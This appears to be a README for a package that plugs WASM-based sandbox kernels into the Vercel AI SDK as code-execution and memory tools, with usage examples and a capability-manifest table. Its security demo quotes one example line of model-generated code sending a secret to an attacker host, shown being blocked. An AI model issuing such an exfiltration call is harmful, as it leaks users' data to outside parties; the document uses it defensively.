# /aisdk

> Drop wasmagent sandbox kernels into the **Vercel AI SDK** as a `tool()`.
> Edge-safe code execution, one capability manifest, no E2B / OS sandbox needed.

[![Open in StackBlitz](https://developer.stackblitz.com/img/open_in_stackblitz.svg)](https://stackblitz.com/github/WasmAgent/wasmagent-js/tree/main/examples/aisdk-quickjs?file=index.mjs)

## Why this exists

Vercel AI SDK 6 has world-class React DX, streaming UI primitives, and
default placement in every Next.js template. What it does NOT have is a way
to run model-generated code inside a real sandbox on the edge. `node:vm` is
forbidden on Cloudflare Workers and Vercel Edge; OS-level sandboxes (E2B,
Daytona, Blaxel) need a server you don't have.

wasmagent's WASM kernels run JavaScript inside QuickJS-in-WASM
(`/kernel-quickjs`) — language-level isolation, no `node:vm`,
~2 MB cold start. Perfect fill for that gap.

## Compared to E2B / Blaxel

|              | WASM kernel (`QuickJSKernel`) | E2B / Blaxel sandbox |
| ------------ | ----------------------------- | -------------------- |
| Cold start   | ~50 ms                        | 200–800 ms           |
| Cost / call  | $0 (in-process)               | per-second billing   |
| Isolation    | Language-level (V8 → QuickJS) | Process / firecracker |
| Network      | Capability-gated `fetch`       | Full networking       |
| Workers safe | ✅                             | ❌ (needs server)     |
| File system  | Capability-gated `__fs__`      | Full POSIX            |

Use the WASM kernel when "model wrote a snippet to do math / parse JSON / try
something" is the workload. Use E2B/Blaxel when you need full POSIX, native
binaries, or untrusted multi-tenant isolation.

## Before / After

Replacing an E2B / Docker code-exec tool with a wasmagent WASM kernel:

```diff
-import { tool } from "ai";
-
-const execTool = tool({
-  description: "Run arbitrary JavaScript code",
-  parameters: z.object({ code: z.string() }),
-  execute: async ({ code }) => dockerExec(code),   // ← needs a server
-});
+import { sandboxedJsTool } from "@wasmagent/aisdk";
+import { QuickJSKernel } from "@wasmagent/kernel-quickjs";
+
+const execTool = sandboxedJsTool({
+  kernel: new QuickJSKernel(),                      // ← in-process, edge-safe
+  capabilities: { allowedHosts: ["api.example.com"] },
+});
```

That's the entire migration. No Docker daemon, no E2B account, no server hop.
The `CapabilityManifest` replaces container-level network/fs policies with
one declarative object that travels with the tool.

## Install

```bash
npm install ai @ai-sdk/openai /aisdk /kernel-quickjs \
  quickjs-emscripten @jitl/quickjs-wasmfile-release-sync zod
```

## One-shot snippet evaluation

```ts
import { generateText } from "ai";
import { openai } from "@ai-sdk/openai";
import { sandboxedJsTool } from "/aisdk";
import { QuickJSKernel } from "/kernel-quickjs";

const kernel = new QuickJSKernel();

const { text } = await generateText({
  model: openai("gpt-4o"),
  tools: {
    runJs: sandboxedJsTool({
      kernel,
      capabilities: { allowedHosts: ["api.example.com"] },
    }),
  },
  prompt: "Compute the 12th Fibonacci number using the runJs tool.",
});
```

## Code-mode: collapse N tools behind one `execute_code`

```ts
import { generateText } from "ai";
import { openai } from "@ai-sdk/openai";
import { codeModeTool } from "/aisdk";
import { QuickJSKernel } from "/kernel-quickjs";
import { ToolRegistry } from "/core";
import { z } from "zod";

const tools = new ToolRegistry();
tools.register({
  name: "search_docs",
  description: "Search the docs corpus.",
  inputSchema: z.object({ query: z.string() }),
  outputSchema: z.array(z.string()),
  readOnly: true,
  idempotent: true,
  forward: async ({ query }) => searchDocs(query),
});
// …40 more tools…

const kernel = new QuickJSKernel();

const { text } = await generateText({
  model: openai("gpt-4o"),
  tools: {
    execute_code: codeModeTool({
      kernel,
      tools,
      capabilities: {
        cpuMs: 5_000,
        memoryLimitBytes: 64 * 1024 * 1024,
      },
    }),
  },
  prompt: "Find the three docs that mention 'cache invalidation' and summarise.",
});
```

The model sees one tool, not forty. The script inside calls `callTool(...)`
N times; only the script's return value re-enters the model context.

## Kernel selection — pick the right tier

`sandboxedJsTool()` and `codeModeTool()` accept any wasmagent kernel.
The choice is independent of the SDK adapter — drop a different kernel
into the same `kernel:` slot and the rest of your code is unchanged:

| Kernel | When to pick it | Edge-safe |
| ------ | --------------- | --------- |
| `QuickJSKernel` (`/kernel-quickjs`) | Default. JS/TS workloads. ~2 MB cold start. | ✅ |
| `PyodideKernel` (`/kernel-pyodide`) | Model emits Python (numpy, pandas, regex-heavy). | ✅ (heavy) |
| `WasmtimeKernel` (`/kernel-wasmtime`) | Multi-language WASM modules / Javy-compiled JS for max isolation. | ✅ |
| `RemoteSandboxKernel` (`/kernel-remote`) | Need full POSIX, native binaries, multi-tenant trust. Backed by E2B / Cloudflare Sandbox. | n/a |

Swap is a one-liner — `kernel: new QuickJSKernel()` becomes `kernel: new PyodideKernel()`. Same `CapabilityManifest`, same tool-call shape, same SDK loop.

## Security demo

`CapabilityManifest` enforces network and filesystem policy at the kernel
boundary — the model cannot escape it regardless of what code it generates:

```ts
import { sandboxedJsTool } from "@wasmagent/aisdk";
import { QuickJSKernel } from "@wasmagent/kernel-quickjs";

const kernel = new QuickJSKernel();
const tool = sandboxedJsTool({
  kernel,
  capabilities: {
    allowedHosts: [],           // no outbound network
    allowedPaths: [],           // no filesystem access
    cpuMs: 5_000,
    memoryLimitBytes: 64 * 1024 * 1024,
  },
});

// Model-generated code that tries to exfiltrate data:
// fetch("https://attacker.example/exfil?data=secret")
// → throws: network access denied — host "attacker.example" not in allowedHosts
```

Set `allowedHosts: ["api.example.com"]` to allow exactly one origin;
glob patterns (`"*.example.com"`) are supported.

## Capability manifest

Every kernel honours the same `CapabilityManifest`:

| Field               | What it gates                                |
| ------------------- | -------------------------------------------- |
| `allowedHosts`      | Outbound `fetch()` (glob host allow-list)    |
| `allowedReadPaths`  | `__fs__.readFile(path)`                      |
| `allowedWritePaths` | `__fs__.writeFile(path, data)`               |
| `env`               | Frozen `__env__` map exposed inside sandbox  |
| `cpuMs`             | Per-call timeout (tightens kernel default)   |
| `memoryLimitBytes`  | Hard runtime memory cap (where supported)    |

See [the unified policy face docs](https://github.com/WasmAgent/wasmagent-js/blob/main/docs/guides/code-mode.md#security-policy-face)
for the per-kernel honouring matrix.

## See also

- [`docs/guides/code-mode.md`](https://github.com/WasmAgent/wasmagent-js/blob/main/docs/guides/code-mode.md)
  — the same code-mode pattern as a standalone MCP server.
- [`/mastra-sandbox`](https://www.npmjs.com/package//mastra-sandbox)
  — the same kernels as a Mastra sandbox provider.

## Memory tool (D3, 2026-06-13)

Cross-session memory backed by any `KvBackend` (Cloudflare KV, Redis,
in-memory Map, …) — same primitive as `createMemoryTool` in
`/core`, exposed as a Vercel AI SDK `tool()`:

```ts
import { generateText } from "ai";
import { memoryTool } from "/aisdk";
import { MapKvBackend } from "/core";

await generateText({
  model: openai("gpt-4o-mini"),
  tools: { memory: memoryTool({ backend: new MapKvBackend() }) },
  prompt: "Remember that the user's preferred CSV delimiter is `;`.",
});
```

The same `memoryTool` is also exposed by `/claude-agent-sdk`
(as `memoryClaudeTool`) and `/openai-agents` (as
`memoryAgentTool`) — pick the one that matches your framework and the
backend follows you across them.

`ObservationalMemory` (continuous compression with prompt-cache-stable
prefix — Mastra OM equivalent) is also re-exported for callers running
an wasmagent `MessageAssembler`.
